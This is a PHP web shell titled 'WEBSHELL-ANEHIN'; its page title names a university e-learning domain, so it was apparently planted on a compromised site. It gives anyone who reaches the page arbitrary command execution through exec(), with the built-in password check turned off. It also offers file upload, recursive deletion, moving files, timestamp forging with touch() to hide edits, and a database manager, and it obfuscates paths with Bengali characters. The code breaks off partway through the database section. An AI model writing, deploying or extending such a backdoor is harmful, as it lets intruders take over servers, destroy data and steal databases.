WEBSHELL-ANEHIN;
<?php
# Konfigurasyon
$sayfaSifreleme ='0'; # 1 acik , 0 kapali
$kullaniciAdi = '123';
$sifre = '123';

# yetki kontrol fonksiyonu
function yetkiKontrol($kullaniciAdi,$sifre) {
if(empty($_SERVER['PHP_AUTH_USER']) || empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] != "$kullaniciAdi" || $_SERVER['PHP_AUTH_PW'] != "$sifre") {
header('WWW-Authenticate: Basic realm="x"');
die(header('HTTP/1.0 401 Unauthorized'));
}
}

# Sayfa Sifreleme aciksa
if($sayfaSifreleme =='1') {
# Veri ve sifre kontrolu
yetkiKontrol($kullaniciAdi,$sifre);
}

// Handle terminal command execution - MUST BE BEFORE ANY HTML OUTPUT
if (isset($_POST['execute_command']) && isset($_POST['command'])) {
    // Determine PATH first
    $root_path = __DIR__;
    if (isset($_GET['q']) && !empty($_GET['q'])) {
        $a = array("/", "\\", ".", ":");
        $b = array("ক", "খ", "গ", "ঘ");
        $p = str_replace($b, $a, $_GET['q']);
        if (is_dir($p)) {
            $working_dir = $p;
        } else {
            $working_dir = $root_path;
        }
    } else {
        $working_dir = $root_path;
    }
    
    // Prevent any output buffering or HTML
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    $command = $_POST['command'];
    
    // Change to the current directory
    $output = array();
    $return_var = 0;
    
    // Execute command with working directory
    $full_command = "cd " . escapeshellarg($working_dir) . " && " . $command . " 2>&1";
    exec($full_command, $output, $return_var);
    
    $result = array(
        'output' => implode("\n", $output),
        'return_code' => $return_var,
        'command' => $command,
        'working_dir' => $working_dir
    );
    
    header('Content-Type: application/json');
    echo json_encode($result);
    exit;
}

// Start session for database connections
session_start();

// Helper function for path encoding
function encodePath($path) {
    $a = array("/", "\\", ".", ":");
    $b = array("ক", "খ", "গ", "ঘ");
    return str_replace($a, $b, $path);
}

function decodePath($path) {
    $a = array("/", "\\", ".", ":");
    $b = array("ক", "খ", "গ", "ঘ");
    return str_replace($b, $a, $path);
}

// Determine PATH early
$root_path = __DIR__;
if (isset($_GET['p'])) {
    if (empty($_GET['p'])) {
        $current_path = $root_path;
    } elseif (!is_dir(decodePath($_GET['p']))) {
        $current_path = $root_path;
    } else {
        $current_path = decodePath($_GET['p']);
    }
} elseif (isset($_GET['q'])) {
    if (!is_dir(decodePath($_GET['q']))) {
        $current_path = $root_path;
    } else {
        $current_path = decodePath($_GET['q']);
    }
} else {
    $current_path = $root_path;
}

// Handle database connection - BEFORE ANY HTML OUTPUT
if (isset($_POST['db_connect'])) {
    $db_type = $_POST['db_type'];
    $db_host = $_POST['db_host'];
    $db_user = $_POST['db_user'];
    $db_pass = $_POST['db_pass'];
    $db_name = isset($_POST['db_name']) ? trim($_POST['db_name']) : '';

    try {
        if ($db_type === 'mysql') {
            $dsn = "mysql:host=$db_host";
            if (!empty($db_name)) {
                $dsn .= ";dbname=$db_name";
            }
            $pdo = new PDO($dsn, $db_user, $db_pass);
        } elseif ($db_type === 'sqlite') {
            $pdo = new PDO("sqlite:$db_host");
        } elseif ($db_type === 'pgsql') {
            $dsn = "pgsql:host=$db_host";
            if (!empty($db_name)) {
                $dsn .= ";dbname=$db_name";
            }
            $pdo = new PDO($dsn, $db_user, $db_pass);
        }

        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        $_SESSION['db_connection'] = [
            'type' => $db_type,
            'host' => $db_host,
            'user' => $db_user,
            'pass' => $db_pass,
            'name' => $db_name
        ];

        // Redirect after successful connection
        header("Location: ?db=overview&q=" . urlencode(encodePath($current_path)));
        exit;
    } catch (PDOException $e) {
        $_SESSION['db_error'] = $e->getMessage();
    }
}

// Handle disconnect - BEFORE ANY HTML OUTPUT
if (isset($_GET['db_disconnect'])) {
    unset($_SESSION['db_connection']);
    header("Location: ?dbconnect&q=" . urlencode(encodePath($current_path)));
    exit;
}

?> 
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eclass.unmer.ac.id</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        body {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            color: #e4e4e4;
        }

        .navbar {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            border-bottom: 1px solid #2d3748;
        }

        .navbar a {
            color: #e4e4e4;
            text-decoration: none;
        }

        .navbar a:hover {
            color: #60a5fa;
        }

        .table {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            color: #e4e4e4;
        }

        .table th {
            background-color: #0f3460;
            color: #e4e4e4;
            border-color: #2d3748;
        }

        .table td {
            border-color: #2d3748;
            color: #e4e4e4;
        }

        .table-hover tbody tr:hover {
            background-color: #2d3748;
            color: #e4e4e4;
        }

        .table a {
            color: #60a5fa;
            text-decoration: none;
        }

        .table a:hover {
            text-decoration: underline;
        }

        .btn-dark {
            background-color: #4a5568;
            border-color: #4a5568;
            color: #ffffff;
        }

        .btn-dark:hover {
            background-color: #5a6a7a;
            border-color: #5a6a7a;
        }

        .form-control, textarea, input[type="text"], input[type="file"], input[type="datetime-local"] {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            color: #e4e4e4;
            border-color: #2d3748;
        }

        .form-control:focus, textarea:focus, input:focus {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            color: #e4e4e4;
            border-color: #60a5fa;
            box-shadow: 0 0 0 0.2rem rgba(96, 165, 250, 0.25);
        }

        textarea {
            background-color: #16213e !important;
            color: #e4e4e4 !important;
        }

        .form-section {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            padding: 20px;
            border-radius: 8px;
            margin: 15px 0;
            border: 1px solid #2d3748;
        }

        .form-section label {
            color: #e4e4e4;
        }

        .bulk-checkbox {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .bulk-actions {
            display: none;
            background-color: #0f3460;
            padding: 10px 15px;
            border-radius: 5px;
            margin: 10px 0;
            align-items: center;
            gap: 15px;
            flex-wrap: wrap;
        }

        .bulk-actions.show {
            display: flex;
        }

        .selected-count {
            font-weight: bold;
            color: #e4e4e4;
        }

        #selectAll {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .btn-primary {
            background-color: #3b82f6;
            border-color: #3b82f6;
            color: #ffffff;
        }

        .btn-primary:hover {
            background-color: #2563eb;
            border-color: #2563eb;
        }

        .action-icons a {
            margin-right: 8px;
            color: #a0a0a0;
        }

        .action-icons a:hover {
            color: #60a5fa;
        }

        .alert-success {
            background-color: #065f46;
            border-color: #047857;
            color: #d1fae5;
        }

        .alert-danger {
            background-color: #7f1d1d;
            border-color: #991b1b;
            color: #fecaca;
        }

        .btn-secondary {
            background-color: #374151;
            border-color: #374151;
        }

        .btn-secondary:hover {
            background-color: #4b5563;
            border-color: #4b5563;
        }

        .btn-danger {
            background-color: #dc2626;
            border-color: #dc2626;
        }

        .btn-danger:hover {
            background-color: #b91c1c;
            border-color: #b91c1c;
        }

        /* Terminal Styles */
        .terminal-container {
            background-color: #0a0e1a;
            border: 1px solid #2d3748;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
        }

        .terminal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid #2d3748;
        }

        .terminal-output {
            background-color: #000000;
            color: #00ff00;
            padding: 15px;
            min-height: 400px;
            max-height: 600px;
            overflow-y: auto;
            border-radius: 5px;
            font-size: 14px;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .terminal-input-group {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .terminal-input {
            flex: 1;
            background-color: #000000;
            color: #00ff00;
            border: 1px solid #2d3748;
            padding: 10px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }

        .terminal-input:focus {
            background-color: #000000;
            color: #00ff00;
            border-color: #60a5fa;
            box-shadow: 0 0 0 0.2rem rgba(96, 165, 250, 0.25);
        }

        .terminal-prompt {
            color: #00ff00;
            font-weight: bold;
        }

        .terminal-error {
            color: #ff4444;
        }

        .terminal-info {
            color: #60a5fa;
        }

        /* Database Manager Styles - Dark Theme */
        .db-manager-container {
            background-color: #0a0e27;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            font-size: 13px;
        }

        .db-manager-header {
            background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
            color: white;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #3b82f6;
            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }

        .db-manager-header h2 {
            margin: 0;
            font-size: 18px;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .db-manager-sidebar {
            width: 220px;
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            color: #e4e4e4;
            padding: 15px 10px;
            float: left;
            min-height: calc(100vh - 50px);
            border-right: 1px solid #2d3748;
        }

        .db-manager-content {
            margin-left: 240px;
            padding: 20px;
            background-color: #0a0e27;
        }

        .db-manager-menu {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            border: 1px solid #2d3748;
            border-radius: 6px;
            padding: 12px 15px;
            margin-bottom: 20px;
            display: flex;
            gap: 20px;
        }

        .db-manager-menu a {
            color: #60a5fa;
            text-decoration: none;
            font-size: 13px;
            padding: 6px 12px;
            border-radius: 4px;
            transition: all 0.2s;
        }

        .db-manager-menu a:hover {
            background-color: #1e3a8a;
            color: #93c5fd;
        }

        .db-manager-menu a.active {
            background-color: #3b82f6;
            color: white;
            font-weight: 500;
        }

        .db-table {
            width: 100%;
            border-collapse: collapse;
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            font-size: 13px;
            border: 1px solid #2d3748;
            border-radius: 6px;
            overflow: hidden;
        }

        .db-table thead {
            background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%);
        }

        .db-table th {
            padding: 10px 12px;
            text-align: left;
            border: 1px solid #2d3748;
            font-weight: 600;
            color: #e4e4e4;
            white-space: nowrap;
        }

        .db-table th a {
            color: #e4e4e4;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .db-table th a:hover {
            color: #60a5fa;
        }

        .db-table td {
            padding: 8px 12px;
            border: 1px solid #2d3748;
            color: #d1d5db;
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
        }

        .db-table tbody tr:hover {
            background-color: #1e3a8a !important;
        }

        .db-table tbody tr:hover td {
            background-color: #1e3a8a !important;
            color: #fff;
        }

        .db-table tbody tr:nth-child(even) td {
            background-color: #1a2942;
        }

        .db-link {
            color: #60a5fa;
            text-decoration: none;
        }

        .db-link:hover {
            color: #93c5fd;
            text-decoration: underline;
        }

        .db-form {
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            padding: 40px 50px;
            border: 1px solid #2d3748;
            border-radius: 8px;
            width: 700px;
            max-width: 90%;
            box-shadow: 0 8px 16px rgba(0,0,0,0.4);
        }

        .db-form h3 {
            margin: 0 0 20px 0;
            font-size: 18px;
            color: #e4e4e4;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .db-form table {
            width: 100%;
            margin-bottom: 5px;
        }

        .db-form td {
            padding: 10px 5px;
            vertical-align: middle;
        }

        .db-form th {
            text-align: right;
            padding: 10px 20px 10px 0;
            font-weight: 500;
            color: #9ca3af;
            white-space: nowrap;
            vertical-align: middle;
            width: 140px;
        }

        .db-input {
            padding: 8px 12px;
            border: 1px solid #2d3748;
            background-color: #0a0e27;
            color: #e4e4e4;
            font-size: 13px;
            border-radius: 4px;
            width: 100%;
            transition: all 0.2s;
        }

        .db-input:focus {
            outline: none;
            border-color: #3b82f6;
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
        }

        .db-button {
            padding: 8px 16px;
            background: linear-gradient(135deg, #374151 0%, #1f2937 100%);
            border: 1px solid #4b5563;
            cursor: pointer;
            font-size: 13px;
            color: #e4e4e4;
            border-radius: 4px;
            transition: all 0.2s;
        }

        .db-button:hover {
            background: linear-gradient(135deg, #4b5563 0%, #374151 100%);
            border-color: #6b7280;
        }

        .db-button-primary {
            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
            color: white;
            border-color: #3b82f6;
        }

        .db-button-primary:hover {
            background: linear-gradient(135deg, #60a5fa 0%, #3b82f6 100%);
            border-color: #60a5fa;
        }

        .db-sql-editor {
            width: 100%;
            height: 250px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            padding: 12px;
            border: 1px solid #2d3748;
            background-color: #0a0e27;
            color: #10b981;
            border-radius: 6px;
            resize: vertical;
        }

        .db-sql-editor:focus {
            outline: none;
            border-color: #3b82f6;
        }

        .db-message {
            padding: 12px 15px;
            margin: 15px 0;
            border-radius: 6px;
            border-left: 4px solid;
        }

        .db-message.success {
            background-color: rgba(16, 185, 129, 0.1);
            border-color: #10b981;
            color: #6ee7b7;
        }

        .db-message.error {
            background-color: rgba(239, 68, 68, 0.1);
            border-color: #ef4444;
            color: #fca5a5;
        }

        .db-checkbox {
            margin: 0 5px 0 0;
            cursor: pointer;
        }

        .db-actions {
            margin-top: 15px;
            padding: 15px;
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            border-radius: 6px;
            border: 1px solid #2d3748;
        }

        .db-sidebar-list {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .db-sidebar-list li {
            padding: 0;
            margin-bottom: 2px;
        }

        .db-sidebar-list a {
            color: #9ca3af;
            text-decoration: none;
            display: block;
            padding: 8px 10px;
            border-radius: 4px;
            transition: all 0.2s;
            font-size: 13px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .db-sidebar-list a:hover {
            background-color: #1e3a8a;
            color: #e4e4e4;
        }

        .db-sidebar-list a.active {
            background-color: #3b82f6;
            color: white;
        }

        .db-info {
            color: #6b7280;
            font-size: 12px;
            margin: 0 0 15px 0;
            padding: 8px 10px;
            background: linear-gradient(180deg,#871737 0,#1f4181 49%,#871737);
            border-radius: 4px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .db-number {
            text-align: right;
            font-family: 'Courier New', monospace;
        }

        .db-logout {
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            color: white;
            padding: 6px 14px;
            border: 1px solid #dc2626;
            cursor: pointer;
            font-size: 13px;
            border-radius: 4px;
            transition: all 0.2s;
        }

        .db-logout:hover {
            background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
        }

        .db-heading {
            font-size: 16px;
            margin: 0 0 15px 0;
            font-weight: 600;
            color: #e4e4e4;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .db-sidebar-heading {
            color: #6b7280;
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin: 15px 0 10px 0;
            padding: 0 10px;
            font-weight: 600;
        }

        .db-badge {
            background-color: #3b82f6;
            color: white;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 11px;
            font-weight: 500;
        }

        .db-action-btn {
            display: inline-block;
            padding: 6px 10px;
            border-radius: 4px;
            text-decoration: none;
            font-size: 13px;
            transition: all 0.2s;
            border: 1px solid;
        }

        .db-action-edit {
            background-color: #374151;
            color: #60a5fa;
            border-color: #4b5563;
        }

        .db-action-edit:hover {
            background-color: #4b5563;
            color: #93c5fd;
        }

        .db-action-delete {
            background-color: #3f1f1f;
            color: #f87171;
            border-color: #7f1d1d;
        }

        .db-action-delete:hover {
            background-color: #7f1d1d;
            color: #fca5a5;
        }

        /* Better table cell display */
        .db-table td {
            max-width: 400px;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .db-table-cell-wrap {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            max-width: 100%;
        }
    </style>
</head>

<body>

    <?php

    //function
    function formatSizeUnits($bytes)
    {
        if ($bytes >= 1073741824) {
            $bytes = number_format($bytes / 1073741824, 2) . ' GB';
        } elseif ($bytes >= 1048576) {
            $bytes = number_format($bytes / 1048576, 2) . ' MB';
        } elseif ($bytes >= 1024) {
            $bytes = number_format($bytes / 1024, 2) . ' KB';
        } elseif ($bytes > 1) {
            $bytes = $bytes . ' bytes';
        } elseif ($bytes == 1) {
            $bytes = $bytes . ' byte';
        } else {
            $bytes = '0 bytes';
        }
        return $bytes;
    }

    function fileExtension($file)
    {
        return substr(strrchr($file, '.'), 1);
    }

    function fileIcon($file)
    {
        $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp");
        $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc");
        $ext = strtolower(fileExtension($file));
        if ($file == "error_log") {
            return '<i class="fa-sharp fa-solid fa-bug"></i> ';
        } elseif ($file == ".htaccess") {
            return '<i class="fa-solid fa-hammer"></i> ';
        }
        if ($ext == "html" || $ext == "htm") {
            return '<i class="fa-brands fa-html5"></i> ';
        } elseif ($ext == "php" || $ext == "phtml") {
            return '<i class="fa-brands fa-php"></i> ';
        } elseif (in_array($ext, $imgs)) {
            return '<i class="fa-regular fa-images"></i> ';
        } elseif ($ext == "css") {
            return '<i class="fa-brands fa-css3"></i> ';
        } elseif ($ext == "txt") {
            return '<i class="fa-regular fa-file-lines"></i> ';
        } elseif (in_array($ext, $audio)) {
            return '<i class="fa-duotone fa-file-music"></i> ';
        } elseif ($ext == "py") {
            return '<i class="fa-brands fa-python"></i> ';
        } elseif ($ext == "js") {
            return '<i class="fa-brands fa-js"></i> ';
        } else {
            return '<i class="fa-solid fa-file"></i> ';
        }
    }

    // Delete directory recursively
    function deleteDirectory($dir) {
        if (!is_dir($dir)) {
            return false;
        }
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) {
            $path = $dir . '/' . $file;
            if (is_dir($path)) {
                deleteDirectory($path);
            } else {
                unlink($path);
            }
        }
        return rmdir($dir);
    }

    $root_path = __DIR__;
    if (isset($_GET['p'])) {
        if (empty($_GET['p'])) {
            $p = $root_path;
        } elseif (!is_dir(decodePath($_GET['p']))) {
            echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
        } elseif (is_dir(decodePath($_GET['p']))) {
            $p = decodePath($_GET['p']);
        }
    } elseif (isset($_GET['q'])) {
        if (!is_dir(decodePath($_GET['q']))) {
            echo ("<script>window.location.replace('?p=');</script>");
        } elseif (is_dir(decodePath($_GET['q']))) {
            $p = decodePath($_GET['q']);
        }
    } else {
        $p = $root_path;
    }
    define("PATH", $p);

    // Handle bulk delete
    if (isset($_POST['bulk_delete']) && isset($_POST['selected_items'])) {
        $items = $_POST['selected_items'];
        $success = 0;
        $failed = 0;
        foreach ($items as $item) {
            $itemPath = PATH . "/" . $item;
            if (is_file($itemPath)) {
                if (unlink($itemPath)) {
                    $success++;
                } else {
                    $failed++;
                }
            } elseif (is_dir($itemPath)) {
                if (deleteDirectory($itemPath)) {
                    $success++;
                } else {
                    $failed++;
                }
            }
        }
        echo ("<script>alert('Deleted: $success items. Failed: $failed items.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
    }

    // Handle bulk move
    if (isset($_POST['bulk_move']) && isset($_POST['selected_items'])) {
        $items = $_POST['selected_items'];
        $destination = trim($_POST['bulk_move_destination']);
        $success = 0;
        $failed = 0;
        if (!empty($destination) && is_dir($destination)) {
            foreach ($items as $item) {
                $itemPath = PATH . "/" . $item;
                $destPath = $destination . "/" . $item;
                if (file_exists($itemPath) && !file_exists($destPath)) {
                    if (rename($itemPath, $destPath)) {
                        $success++;
                    } else {
                        $failed++;
                    }
                } else {
                    $failed++;
                }
            }
            echo ("<script>alert('Moved: $success items. Failed: $failed items.'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        } else {
            echo ("<script>alert('Invalid destination folder!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
        }
    }

    // Handle create new file
    if (isset($_POST['create_file'])) {
        $newFileName = trim($_POST['new_filename']);
        if (!empty($newFileName)) {
            $newFilePath = PATH . "/" . $newFileName;
            if (file_exists($newFilePath)) {
                echo ("<script>alert('File or folder already exists!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                $content = isset($_POST['new_file_content']) ? $_POST['new_file_content'] : '';
                if (file_put_contents($newFilePath, $content) !== false) {
                    echo ("<script>alert('File created successfully!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Error creating file!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    // Handle create new folder
    if (isset($_POST['create_folder'])) {
        $newFolderName = trim($_POST['new_foldername']);
        if (!empty($newFolderName)) {
            $newFolderPath = PATH . "/" . $newFolderName;
            if (file_exists($newFolderPath)) {
                echo ("<script>alert('File or folder already exists!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                if (mkdir($newFolderPath, 0755)) {
                    echo ("<script>alert('Folder created successfully!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Error creating folder!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    // Handle move file/folder
    if (isset($_POST['move_item']) && isset($_GET['m'])) {
        $itemToMove = PATH . "/" . $_GET['m'];
        $destination = trim($_POST['move_destination']);
        if (!empty($destination) && file_exists($itemToMove)) {
            $destPath = $destination . "/" . $_GET['m'];
            if (file_exists($destPath)) {
                echo ("<script>alert('An item with the same name already exists in the destination!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } elseif (!is_dir($destination)) {
                echo ("<script>alert('Destination folder does not exist!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                if (rename($itemToMove, $destPath)) {
                    echo ("<script>alert('Item moved successfully!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                } else {
                    echo ("<script>alert('Error moving item!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
                }
            }
        }
    }

    // Handle change file date
    if (isset($_POST['change_date']) && isset($_GET['t'])) {
        $targetFile = PATH . "/" . $_GET['t'];
        $newDate = strtotime($_POST['new_datetime']);
        if ($newDate && file_exists($targetFile)) {
            if (touch($targetFile, $newDate, $newDate)) {
                echo ("<script>alert('Date changed successfully!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            } else {
                echo ("<script>alert('Error changing date!'); window.location.replace('?p=" . encodePath(PATH) . "');</script>");
            }
        }
    }

    echo ('
<nav class="navbar navbar-light">
  <div class="navbar-brand">
  <a href="?"><img src="https://github.com/fluidicon.png" width="30" height="30" alt=""></a>
');

    $path = str_replace('\\', '/', PATH);
    $paths = explode('/', $path);
    foreach ($paths as $id => $dir_part) {
        if ($dir_part == '' && $id == 0) {
            $a = true;
            echo "<a href=\"?p=/\">/</a>";
            continue;
        }
        if ($dir_part == '')
            continue;
        echo "<a href='?p=";
        for ($i = 0; $i <= $id; $i++) {
            echo str_replace(":", "ঘ", $paths[$i]);
            if ($i != $id)
                echo "ক";
        }
        echo "'>" . $dir_part . "</a>/";
    }
    echo ('
</div>
<div class="form-inline d-flex gap-2">
<a href="?newfile&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button"><i class="fa-solid fa-file-circle-plus"></i> New File</button></a>
<a href="?newfolder&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button"><i class="fa-solid fa-folder-plus"></i> New Folder</button></a>
<a href="?upload&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button"><i class="fa-solid fa-upload"></i> Upload</button></a>
<a href="?terminal&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button"><i class="fa-solid fa-terminal"></i> Terminal</button></a>
<a href="?dbconnect&q=' . urlencode(encodePath(PATH)) . '"><button class="btn btn-dark" type="button"><i class="fa-solid fa-database"></i> DB Connect</button></a>
<a href="?"><button type="button" class="btn btn-dark"><i class="fa-solid fa-home"></i> HOME</button></a> 
</div>
</nav>');

    // Terminal Interface
    if (isset($_GET['terminal'])) {
        echo '
    <div class="terminal-container">
        <div class="terminal-header">
            <h5><i class="fa-solid fa-terminal"></i> Web Terminal</h5>
            <div>
                <span class="terminal-info">Working Directory: ' . htmlspecialchars(PATH) . '</span>
                <a href="?p=' . encodePath(PATH) . '" class="btn btn-secondary btn-sm ms-3">
                    <i class="fa-solid fa-times"></i> Close Terminal
                </a>
            </div>
        </div>
        <div class="terminal-output" id="terminalOutput">
            <span class="terminal-info">Web Terminal v1.0 - Ready</span>
            <br><span class="terminal-info">Current Directory: ' . htmlspecialchars(PATH) . '</span>
            <br><span class="terminal-prompt">$ </span>
        </div>
        <div class="terminal-input-group">
            <input type="text" class="terminal-input" id="terminalInput" placeholder="Enter command..." autocomplete="off">
            <button class="btn btn-primary" onclick="executeCommand()">
                <i class="fa-solid fa-play"></i> Execute
            </button>
            <button class="btn btn-secondary" onclick="clearTerminal()">
                <i class="fa-solid fa-eraser"></i> Clear
            </button>
        </div>
    </div>
    
    <script>
        const terminalOutput = document.getElementById("terminalOutput");
        const terminalInput = document.getElementById("terminalInput");
        
        // Execute command on Enter key
        terminalInput.addEventListener("keypress", function(event) {
            if (event.key === "Enter") {
                event.preventDefault();
                executeCommand();
            }
        });
        
        // Focus on terminal input
        terminalInput.focus();
        
        function executeCommand() {
            const command = terminalInput.value.trim();
            
            if (command === "") {
                return;
            }
            
            // Display the command
            const promptLine = document.createElement("div");
            promptLine.innerHTML = \'<span class="terminal-prompt">$ </span>\' + escapeHtml(command);
            terminalOutput.appendChild(promptLine);
            
            // Clear input
            terminalInput.value = "";
            
            // Send AJAX request
            const formData = new FormData();
            formData.append("execute_command", "1");
            formData.append("command", command);
            
            fetch(window.location.href, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                const outputDiv = document.createElement("div");
                
                if (data.output) {
                    if (data.return_code !== 0) {
                        outputDiv.innerHTML = \'<span class="terminal-error">\' + escapeHtml(data.output) + \'</span>\';
                    } else {
                        outputDiv.textContent = data.output;
                    }
                } else {
                    outputDiv.innerHTML = \'<span class="terminal-info">[Command executed with no output]</span>\';
                }
                
                terminalOutput.appendChild(outputDiv);
                
                // Add new prompt
                const newPrompt = document.createElement("span");
                newPrompt.className = "terminal-prompt";
                newPrompt.textContent = "$ ";
                terminalOutput.appendChild(newPrompt);
                
                // Scroll to bottom
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            })
            .catch(error => {
                const errorDiv = document.createElement("div");
                errorDiv.innerHTML = \'<span class="terminal-error">Error: \' + escapeHtml(error.message) + \'</span>\';
                terminalOutput.appendChild(errorDiv);
                
                // Scroll to bottom
                terminalOutput.scrollTop = terminalOutput.scrollHeight;
            });
        }
        
        function clearTerminal() {
            terminalOutput.innerHTML = \'<span class="terminal-info">Terminal cleared</span><br><span class="terminal-prompt">$ </span>\';
            terminalInput.focus();
        }
        
        function escapeHtml(text) {
            const div = document.createElement("div");
            div.textContent = text;
            return div.innerHTML;
        }
    </script>';
    }

    // Database Manager Interface
    if (isset($_GET['dbconnect']) || isset($_GET['db'])) {
        // Check if connected
        $is_connected = isset($_SESSION['db_connection']);
        $pdo = null;

        if ($is_connected) {
            try {
                $conn = $_SESSION['db_connection'];
                if ($conn['type'] === 'mysql') {
                    $dsn = "mysql:host={$conn['host']}";
                    if (!empty($conn['name'])) {
                        $dsn .= ";dbname={$conn['name']}";
                    }
                    $pdo = new PDO($dsn, $conn['user'], $conn['pass']);
                } elseif ($conn['type'] === 'sqlite') {
                    $pdo = new PDO("sqlite:{$conn['host']}");
                } elseif ($conn['type'] === 'pgsql') {
                    $dsn = "pgsql:host={$conn['host']}";
                    if (!empty($conn['name'])) {
                        $dsn .= ";dbname={$conn['name']}";
                    }
                    $pdo = new PDO($dsn, $conn['user'], $conn['pass']);
                }
                $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            } catch (PDOException $e) {
                $is_connected = false;
                unset($_SESSION['db_connection']);
            }
        }

        echo '<div class="db-manager-container">';
        echo '<div class="db-manager-header">';
        echo '<h2><i class="fa-solid fa-database"></i> Database Manager</h2>';
        echo '<div>';
        if ($is_connected) {
            echo '<span class="db-badge" style="margin-right: 10px;">' . strtoupper($conn['type']) . ' @ ' . htmlspecialchars($conn['host']) . '</span>';
            echo '<button onclick="location.href=\'?db_disconnect&q=' . urlencode(encodePath(PATH)) . '\'" class="db-logout"><i class="fa-solid fa-sign-out-alt"></i> Disconnect</button>';
        }
        echo '</div></div>';
        
        if ($is_connected) {
            echo '<div class="db-manager-sidebar">';
            echo '<div class="db-info"><i class="fa-solid fa-database"></i> ' . htmlspecialchars($conn['name'] ? $conn['name'] : 'Select database') . '</div>';
            
            // Sidebar menu
            echo '<div class="db-sidebar-heading">Navigation</div>';
